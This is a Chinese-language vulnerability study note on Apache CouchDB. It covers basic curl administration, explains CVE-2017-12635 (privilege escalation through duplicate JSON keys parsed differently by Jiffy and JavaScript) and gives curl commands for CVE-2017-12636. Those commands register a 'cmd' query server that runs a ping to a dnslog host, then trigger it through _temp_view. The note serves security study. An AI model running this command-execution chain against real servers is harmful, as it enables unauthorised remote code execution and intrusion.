# CouchDB

CouchDB属于NoSQL数据库的一种，数据库内容以Documents形式而不是表形式存储，有Map/Reduce系统支持。CouchDB用Erlang编写，但允许用户在Javascript中指定文档验证脚本。创建或更新文档时会自动执行这些脚本。 
官方网址： https://couchdb.apache.org/  
历史安装版本下载地址：https://archive.apache.org/dist/couchdb/binary/win/1.6.1/  
历史源码下载： https://archive.apache.org/dist/couchdb/source/1.6.1/  
重点历史漏洞：
|漏洞编号| 漏洞类型 |影响版本|
|:----:|:----:|:----:|
|CVE-2017-12635|远程权限提升| < 1.7.1 or 2.1.1|
|CVE-2017-12636|RCE| < 1.7.1 or 2.1.1|

### 基本使用
CouchDB主要有两种管理方式，一种是通过curl发包，另一种是通过自身名为Futon的管理界面  
CouchDB的Web地址：http://127.0.0.1:5984/  
CouchDB的Futon管理界面： http://localhost:5984/_utils/  

默认表： `_users`和`_replicator`

**curl语句**  
查看数据库列表： `curl -X GET http://127.0.0.1:5984/_all_dbs`  
创建数据库： `curl -X PUT http://localhost:5984/database_name`  
删除数据库： `curl -X DELETE http://127.0.0.1:5984/database_name`  
创建文档： `curl -X PUT http://127.0.0.1:5984/database_name/"001" -d "{\"Name\":\"AxisX\",\"age\":\"18\",\"Title\":\"Hacker\"}" -H "Content-Type: application/json"`  
更新文档： `curl -X PUT http://127.0.0.1:5984/database_name/"001" -d "{\"age\":\"19\",\"_rev\":\"revisionID\"}" -H "Content-Type: application/json"`  
删除文档： `curl -X DELETE http://127.0.0.1:5984/database_name/001?rev=revisionID`  
附加文件： `curl -vX PUT http://127.0.0.1:5984/database_name/001/boy.jpg?rev=revisionID --data-binary @boy.jpg -H "ContentType:image/jpg"`  
创建用户： `curl -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:testuser -H "Content-Type: application/json" -d "{\"name\":\"testuser\",\"password\":\"testuser\",\"roles\":[],\"type\":\"user\"}'`  
用户登陆： `curl -vX POST https://dev.imaicloud.com/couchdb/_session -H "Content-Type:application/x-www-form-urlencoded" -d "name=test&password=test"`  


### CVE-2017-12635
参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
如果CouchDB安装后配置了用户，那么打开`_users`表会存在一个默认Key`"_design/_auth"`，该Key包含了四个Field：`_id:`_design/_auth、`_rev:xxx`、`language:javascript`、`validate_doc_update:function(xxx)`。`validate_doc_update`字段具体值如下，是javascript的脚本
```javascript
    function(newDoc, oldDoc, userCtx, secObj) {
        if (newDoc._deleted === true) {
            // allow deletes by admins and matching users
            // without checking the other fields
            if ((userCtx.roles.indexOf('_admin') !== -1) ||
                (userCtx.name == oldDoc.name)) {
                return;
            } else {
                throw({forbidden: 'Only admins may delete other user docs.'});
            }
        }

        if ((oldDoc && oldDoc.type !== 'user') || newDoc.type !== 'user') {
            throw({forbidden : 'doc.type must be user'});
        } // we only allow user docs for now

        if (!newDoc.name) {
            throw({forbidden: 'doc.name is required'});
        }

        if (!newDoc.roles) {
            throw({forbidden: 'doc.roles must exist'});
        }

        if (!isArray(newDoc.roles)) {
            throw({forbidden: 'doc.roles must be an array'});
        }

        for (var idx = 0; idx < newDoc.roles.length; idx++) {
            if (typeof newDoc.roles[idx] !== 'string') {
                throw({forbidden: 'doc.roles can only contain strings'});
            }
        }

        if (newDoc._id !== ('org.couchdb.user:' + newDoc.name)) {
            throw({
                forbidden: 'Doc ID must be of the form org.couchdb.user:name'
            });
        }

        if (oldDoc) { // validate all updates
            if (oldDoc.name !== newDoc.name) {
                throw({forbidden: 'Usernames can not be changed.'});
            }
        }

        if (newDoc.password_sha && !newDoc.salt) {
            throw({
                forbidden: 'Users with password_sha must have a salt.' +
                    'See /_utils/script/couch.js for example code.'
            });
        }

        if (newDoc.password_scheme === "pbkdf2") {
            if (typeof(newDoc.iterations) !== "number") {
               throw({forbidden: "iterations must be a number."});
            }
            if (typeof(newDoc.derived_key) !== "string") {
               throw({forbidden: "derived_key must be a string."});
            }
        }

        var is_server_or_database_admin = function(userCtx, secObj) {
            // see if the user is a server admin
            if(userCtx.roles.indexOf('_admin') !== -1) {
                return true; // a server admin
            }

            // see if the user a database admin specified by name
            if(secObj && secObj.admins && secObj.admins.names) {
                if(secObj.admins.names.indexOf(userCtx.name) !== -1) {
                    return true; // database admin
                }
            }

            // see if the user a database admin specified by role
            if(secObj && secObj.admins && secObj.admins.roles) {
                var db_roles = secObj.admins.roles;
                for(var idx = 0; idx < userCtx.roles.length; idx++) {
                    var user_role = userCtx.roles[idx];
                    if(db_roles.indexOf(user_role) !== -1) {
                        return true; // role matches!
                    }
                }
            }

            return false; // default to no admin
        }

        if (!is_server_or_database_admin(userCtx, secObj)) {
            if (oldDoc) { // validate non-admin updates
                if (userCtx.name !== newDoc.name) {
                    throw({
                        forbidden: 'You may only update your own user document.'
                    });
                }
                // validate role updates
                var oldRoles = oldDoc.roles.sort();
                var newRoles = newDoc.roles.sort();

                if (oldRoles.length !== newRoles.length) {
                    throw({forbidden: 'Only _admin may edit roles'});
                }

                for (var i = 0; i < oldRoles.length; i++) {
                    if (oldRoles[i] !== newRoles[i]) {
                        throw({forbidden: 'Only _admin may edit roles'});
                    }
                }
            } else if (newDoc.roles.length > 0) {
                throw({forbidden: 'Only _admin may set roles'});
            }
        }

        // no system roles in users db
        for (var i = 0; i < newDoc.roles.length; i++) {
            if (newDoc.roles[i][0] === '_') {
                throw({
                    forbidden:
                    'No system roles (starting with underscore) in users db.'
                });
            }
        }

        // no system names as names
        if (newDoc.name[0] === '_') {
            throw({forbidden: 'Username may not start with underscore.'});
        }

        var badUserNameChars = [':'];

        for (var i = 0; i < badUserNameChars.length; i++) {
            if (newDoc.name.indexOf(badUserNameChars[i]) >= 0) {
                throw({forbidden: 'Character `' + badUserNameChars[i] +
                        '` is not allowed in usernames.'});
            }
        }
    }
```
这个javascript脚本对请求中的权限等进行了校验，如果不合规就抛出异常。Erlang语言有很多解析JSON的库，例如`mochijson2，Jiffy`。CouchDB用到的JSON解析器在官方文档的`1.10. Troubleshooting an Installation`部分有提到，CouchDB不同版本用到了不同的JSON encoders，即JSON编码器。早期用的就是Jiffy  
但是Javascript对于JSON的解析和Jiffy存在差异，尤其在**重复键**上，例如JSON语句`{"foo":"bar", "foo":"baz"}`，二者的解析对比结果如下
```
> jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}"). 
{[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}

> JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
{foo: "baz"}
```
对于给定的键，Erlang解析器Jiffy将存储两个值，但Javascript解析器将只存储最后一个值。而CouchDB在处理数据时其getter函数只返回第一个值。所以如果让第一个值是admin权限，第二个值是个空值。就可以绕过javascript校验
```
% Within couch_util:get_value 
lists:keysearch(Key, 1, List).
```

### CVE-2017-12636
参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
这篇文章中同样提到，如何获取shell。CouchDB允许通过query_server定义语言来执行命令。查询1.6的CouchDB说明文档， `3.8.1 Query Servers Definition`部分说到CouchDB的Design Functions计算功能是由外部查询服务器执行的，而外部查询服务器实际上是一个特殊的操作系统进程，外部查询服务器需要在配置文件中定义
```
[query_servers]
LANGUAGE = PATH ARGS
```
Language是外部查询服务器会执行的代码，PATH是二进制文件的路径，ARGS是命令行参数。根据API接口文档，想要更改配置文件需要`PUT /_config/{section}/{key}`，那么设置query_servers的代码如下
```
curl -X PUT 'http://admin:admin@your-ip:5984/_config/query_servers/cmd' -d '"ping xxx.dnslog.cn"'
```
API文档中提到想要执行view function的代码如下`POST /{db}/_temp_view`，但是想要执行这个代码就需要有一个真实存在的db，所以payload也是先创建了db和具体的doc。
```
curl -X PUT 'http://admin:admin@your-ip:5984/my_database'
curl -X PUT 'http://admin:admin@your-ip:5984/my_database/"001" -d "{\"Name\":\"AxisX\",\"age\":\"18\",\"Title\":\"Hacker\"}" -H "Content-Type: application/json"`
curl -X POST 'http://admin:admin@your-ip:5984/my_database/_temp_view?limit=10' -d '{"language": "cmd", "map":""}' -H 'Content-Type: application/json'
```

